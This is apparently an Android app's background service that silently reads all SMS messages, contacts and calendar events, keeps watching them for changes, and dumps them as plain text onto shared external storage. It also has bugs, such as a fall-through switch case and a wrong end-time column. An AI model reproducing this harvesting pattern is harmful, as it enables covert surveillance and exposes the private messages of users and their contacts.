package com.example.samuelfisueoyanna.jumbo;


import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.util.Log;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.StringWriter;
import java.nio.charset.Charset;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Set;
import java.util.TreeSet;


public class MyService extends Service {

    public MyService() {

    }

    private static final String USER_OLD_TEXT_READ = "USER_OLD_TEXT_READ";

    private String SMS_INBOX_FILE = "Received.txt";
    private String SMS_OUTBOX_FILE = "Sent.txt";
    private String CONTACT_FILE_NAME = "Contact.txt";
    private String CALENDAR_FILE_NAME = "CalendarEvent.txt";

    private ThrottledContentObserver inboxObserver = null;
    private ThrottledContentObserver contactObserver = null;
    private ThrottledContentObserver calendarObserver = null;

    private MyCalendar m_calendars[];
    private String m_selectedCalendarId = "0";



    @Override
    public void onCreate() {
        super.onCreate();

        inboxObserver = new ThrottledContentObserver(new Callbacks() {
            @Override
            public void onThrottledContentObserverFired() {
                Log.i("TAG", "INBOX RESOLVER TOGGLED");
                runUpLoad(ACTION.READ_SMS);
            }
        });
        contactObserver = new ThrottledContentObserver(new Callbacks() {
            @Override
            public void onThrottledContentObserverFired() {
                Log.i("TAG", "CONTACT RESOLVER TOGGLED");
                runUpLoad(ACTION.READ_CONTACT);
            }
        });
        calendarObserver = new ThrottledContentObserver(new Callbacks() {
            @Override
            public void onThrottledContentObserverFired() {
                Log.i("TAG", "CONTACT RESOLVER TOGGLED");
                runUpLoad(ACTION.READ_CALENDAR);
            }
        });
        runUpLoad(ACTION.READ_SMS);
        runUpLoad(ACTION.READ_CONTACT);
        runUpLoad(ACTION.READ_CALENDAR);


    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");

    }

    @Override
    public void onDestroy() {
        try {
            unRegisterObservers();
        } catch (Exception ignore) {
        }
        super.onDestroy();

    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        SharedPreferences preferences =
                PreferenceManager.getDefaultSharedPreferences(this);
        boolean hasUploadedUsersOldText =
                preferences.getBoolean(USER_OLD_TEXT_READ, false);

        if (hasUploadedUsersOldText) {
            registerObservers();
        } else {
            runUpLoad(ACTION.READ_ALL);
        }

        Log.i("TAG", "ON START");
        return START_STICKY;
    }


    private void registerObservers() {

        ContentResolver contentResolver = getContentResolver();
        contentResolver.registerContentObserver(Uri.parse("content://sms"),
                true, inboxObserver);
        contentResolver.registerContentObserver(ContactsContract.Contacts.CONTENT_URI,
                true, contactObserver);
        contentResolver.registerContentObserver(Uri.parse("content://calendar/events"),
                true, calendarObserver);
        Log.i("TAG", "REGISTERING CONTENT OBSERVERS");
    }

    private void unRegisterObservers() {
        ContentResolver contentResolver = getContentResolver();
        contentResolver.unregisterContentObserver(inboxObserver);
        contentResolver.unregisterContentObserver(contactObserver);
        contentResolver.unregisterContentObserver(calendarObserver);
    }

    private void runUpLoad(ACTION action) {
        new AsyncTask<ACTION, Void, Void>() {

            @Override
            protected Void doInBackground(ACTION... voids) {
                Log.i("TAG", "START TO WRITE");
                switch (voids[0]) {
                    case READ_CONTACT:
                        Log.i("TAG", "WRITING CONTACTS");
                        handleReadContacts();
                        break;
                    case READ_SMS:
                        Log.i("TAG", "WRITING MESAGGES");
                        handleReadOutBox();
                        handleReadInbox();
                        break;
                    case READ_CALENDAR:
                        Log.i("TAG", "WRITING CALENDAR");
                        handleReadCalendar();


                    default:
                        handleReadOutBox();
                        handleReadInbox();
                        handleReadContacts();
                        handleReadCalendar();
                        SharedPreferences preferences =
                                PreferenceManager.getDefaultSharedPreferences(MyService.this);

                        preferences.edit().putBoolean(USER_OLD_TEXT_READ, true).commit();
                        registerObservers();
                        break;

                }
                Log.i("TAG", "DONE WRITING");
                return null;
            }

            @Override
            protected void onPostExecute(Void aVoid) {

                super.onPostExecute(aVoid);
            }
        }.execute(action);

    }

    public List<Sms> getAllSms(String folderName) {

        List<Sms> lstSms = new ArrayList<>();
        Sms objSms;
        Uri message = Uri.parse("content://sms/" + folderName);
        ContentResolver cr = getContentResolver();

        Cursor c = cr.query(message, null, null, null, null);
        int totalSMS = c.getCount();

        if (c.moveToFirst()) {
            for (int i = 0; i < totalSMS; i++) {
                try {
                    objSms = new Sms();
                    objSms.setId(c.getString(c.getColumnIndexOrThrow("_id")));

                    objSms.setAddress(c.getString(c.getColumnIndexOrThrow("address")));
                    objSms.setMsg(c.getString(c.getColumnIndexOrThrow("body")));
                    lstSms.add(objSms);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                c.moveToNext();
            }
        }
        c.close();

        return lstSms;
    }

    private void handleReadInbox() {
        List<Sms> inbox = getAllSms("inbox");
        StringWriter stringWriter = new StringWriter();
        stringWriter.append("SENDER\t\tMESSAGE\n");

        for (Sms sms : inbox) {
            stringWriter.append(sms.getAddress() + "\t\t" +
                    sms.getMsg() + "\n");
        }

        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),
                SMS_INBOX_FILE);

        try {
            if (!file.exists()) {
                file.createNewFile();
            }

            FileOutputStream fileOutputStream = new FileOutputStream(file, false);
            OutputStreamWriter outputStreamWriter = new
                    OutputStreamWriter(fileOutputStream, Charset.forName("UTF-8"));
            outputStreamWriter.write(stringWriter.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleReadOutBox() {
        List<Sms> inbox = getAllSms("sent");
        StringWriter stringWriter = new StringWriter();
        stringWriter.append("SENDER\t\tMESSAGE\n\n");

        for (Sms sms : inbox) {
            stringWriter.append(sms.getAddress() + "\t\t" +
                    sms.getMsg() + "\n\n");
        }

        File file = new
                File(Environment.getExternalStorageDirectory().getAbsolutePath(),
                SMS_OUTBOX_FILE);
        try {
            if (!file.exists()) {
                //file.mkdirs();
                file.createNewFile();
            }
            FileOutputStream fileOutputStream = new
                    FileOutputStream(file, false);
            OutputStreamWriter outputStreamWriter = new
                    OutputStreamWriter(fileOutputStream, Charset.forName("UTF-8"));
            outputStreamWriter.write(stringWriter.toString());
            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleReadContacts() {
        List<Contact> contacts = getPhoneContactList();
        StringWriter stringWriter = new StringWriter();
        stringWriter.append("CONTACT\t\t\tNUMBERS\n");

        for (Contact contact : contacts) {
            stringWriter.append(contact.getName() + "\t\t");
            for (String number : contact.getPhoneNumber()) {
                stringWriter.append(number + "\t\t");
            }
            stringWriter.append("\n");
        }

        File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath(),
                    CONTACT_FILE_NAME);
        try {
            if (!file.exists()) {
                file.createNewFile();
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file, false);
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(fileOutputStream,
                                                    Charset.forName("UTF-8"));
            outputStreamWriter.write(stringWriter.toString());

            outputStreamWriter.flush();
            outputStreamWriter.close();
            fileOutputStream.flush();
            fileOutputStream.close();


        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    private class Sms {
        private String id;
        private String address;

        public String getMsg() {
            return msg;
        }

        public void setMsg(String msg) {
            this.msg = msg;
        }

        public String getAddress() {
            return address;
        }

        public void setAddress(String address) {
            this.address = address;
        }

        public String getId() {
            return id;
        }

        public void setId(String id) {
            this.id = id;
        }

        private String msg;
    }

    private List<Contact> getPhoneContactList() {

        ContentResolver cr = getContentResolver();
        List<Contact> contacts = new ArrayList<>();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {

            while (cur.moveToNext()) {

                String id =
                        cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name =
                        cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                Contact contact = new Contact();
                contact.setName(name);
                if(Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                    Set<String> stringSet = new TreeSet<>();
                    while (pCur.moveToNext()) {

                        String phoneNo =
                                pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)).replaceAll("[^0-9]",
                                        "");
                        stringSet.add(phoneNo);

                    }
                    contact.setPhoneNumber(stringSet);
                    pCur.close();
                    contacts.add(contact);
                }

            }
        }
        return contacts;
    }

    public class Contact {
        private String name;
        private Set<String> phoneNumber;

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public Set<String> getPhoneNumber() {
            return phoneNumber;
        }

        public void setPhoneNumber(Set<String> phoneNumber) {
            this.phoneNumber = phoneNumber;
        }
    }

    private enum ACTION {
        READ_SMS, READ_CONTACT, READ_CALENDAR, READ_ALL
    }

    interface Callbacks {
        public void onThrottledContentObserverFired();
    }

    class ThrottledContentObserver extends ContentObserver {
        Handler mMyHandler;
        Runnable mScheduledRun = null;
        private static final int THROTTLE_DELAY = 2000;
        Callbacks mCallback = null;


        public ThrottledContentObserver(Callbacks callback) {
            super(null);
            mMyHandler = new Handler();
            mCallback = callback;
        }

        @Override
        public void onChange(boolean selfChange) {
            if (mScheduledRun != null) {
                mMyHandler.removeCallbacks(mScheduledRun);
            } else {
                mScheduledRun = new Runnable() {
                    @Override
                    public void run() {
                        if (mCallback != null) {
                            mCallback.onThrottledContentObserverFired();
                        }
                    }
                };
            }
            mMyHandler.postDelayed(mScheduledRun, THROTTLE_DELAY);
        }

        public void cancelPendingCallback() {
            if (mScheduledRun != null) {
                mMyHandler.removeCallbacks(mScheduledRun);
            }
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            onChange(selfChange);
        }
    }

    class Event {
        private String title;
        private String start;
        private String end;

    }
    private void handleReadCalendar()  {
        List<Event> events = getLastFiftyEvents();
        StringBuilder builder = new StringBuilder("TITLE \t\t\tSTART \t\tEND");


        for (Event event : events) {
            builder.append(event.title);
            builder.append("\\t");
            builder.append(event.start);
            builder.append("\\t");
            builder.append(event.end);
            builder.append("\\n");
        }

        try {
            File newFolder = new File(Environment.getExternalStorageDirectory(), "CalendarEvents");
            if (!newFolder.exists()) {
                newFolder.mkdir();
            }
            try {
                File file = new File(newFolder, "Event" + ".txt");
                file.createNewFile();
                FileWriter writer = new FileWriter(file);
                writer.write(builder.toString());
                writer.close();

            } catch (Exception ex) {
                System.out.println("ex: " + ex);
            }
        } catch (Exception e) {
            System.out.println("e: " + e);
        }

     //   File file = new
             //   File(Environment.getExternalStorageDirectory().getAbsolutePath(), "event.txt");
       // FileWriter writer = new FileWriter(file);
      //  writer.write(builder.toString());
      //  writer.close();
    }
    private List<Event> getLastFiftyEvents() {

        ContentResolver cr = getContentResolver();
        Uri l_eventUri;
        if (Build.VERSION.SDK_INT >= 8) {
            l_eventUri = Uri.parse("content://com.android.calendar/events");
        } else {
            l_eventUri = Uri.parse("content://calendar/events");
        }


        String[] l_projection = new String[]{"title", "dtstart", "dtend"};
        Cursor l_managedCursor = cr.query(l_eventUri, l_projection,
                "calendar_id=" + m_selectedCalendarId, null, "dtstart DESC, dtend DESC");
        //Cursor l_managedCursor = this.managedQuery(l_eventUri,
        //l_projection, null, null, null);
        List<Event> events = new ArrayList<>();
        if (l_managedCursor.moveToFirst()) {
            int l_cnt = 0;
            String l_title;
            String l_begin;
            String l_end;

            StringBuilder l_displayText = new StringBuilder();
            int l_colTitle = l_managedCursor.getColumnIndex(l_projection[0]);
            int l_colBegin = l_managedCursor.getColumnIndex(l_projection[1]);
            int l_colEnd = l_managedCursor.getColumnIndex(l_projection[1]);
            Event event = null;


            while (l_managedCursor.moveToNext() && l_cnt < 50) {


                event = new Event();
                event.title = l_managedCursor.getString(l_colTitle);
                event.start = getDateTimeStr(l_managedCursor.getString(l_colBegin));
                event.end = getDateTimeStr(l_managedCursor.getString(l_colEnd));
                events.add(event);
                l_displayText.append(event.title + "\n" + event.start + "\n" + event.end + "\n----------------\n");
                ++l_cnt;

            }

            l_managedCursor.close();



        }
        return events;
    }

    private static final String DATE_TIME_FORMAT = "yyyy MMM dd, HH:mm:ss";
    public static String getDateTimeStr(int p_delay_min) {
        Calendar cal = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat(DATE_TIME_FORMAT);
        if (p_delay_min == 0) {
            return sdf.format(cal.getTime());
        } else {
            Date l_time = cal.getTime();
            l_time.setMinutes(l_time.getMinutes() + p_delay_min);
            return sdf.format(l_time);
        }
    }
    public static String getDateTimeStr(String p_time_in_millis) {
        SimpleDateFormat sdf = new SimpleDateFormat(DATE_TIME_FORMAT);
        Date l_time = new Date(Long.parseLong(p_time_in_millis));
        return sdf.format(l_time);
    }

    class MyCalendar {
        public String name;
        public String id;

        public MyCalendar(String _name, String _id) {
            name = _name;
            id = _id;
        }

        @Override
        public String toString() {
            return name;
        }
    }
}



/*






 <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>



*/
